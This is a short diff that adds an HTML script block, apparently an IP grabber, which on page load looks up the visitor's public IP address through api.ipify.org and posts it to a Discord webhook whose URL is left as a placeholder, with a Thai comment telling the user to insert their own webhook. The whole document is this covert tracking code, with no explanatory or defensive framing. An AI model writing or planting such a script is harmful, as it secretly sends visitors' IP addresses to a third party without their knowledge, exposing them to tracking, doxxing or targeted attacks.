@@ -1,0 +1,15 @@
+<script>
+fetch('https://api.ipify.org?format=json')
+    .then(response => response.json())
+    .then(data => {
+        let ip = data.ip;
+        let webhookURL = "https://discord.com/api/webhooks/XXXX/XXXX"; // ใส่ Webhook ของคุณที่นี่
+
+        fetch(webhookURL, {
+            method: "POST",
+            headers: {"Content-Type": "application/json"},
+            body: JSON.stringify({"content": "**IP:** " + ip})
+        });
+    })
+    .catch(error => console.error("Error:", error));
+</script>
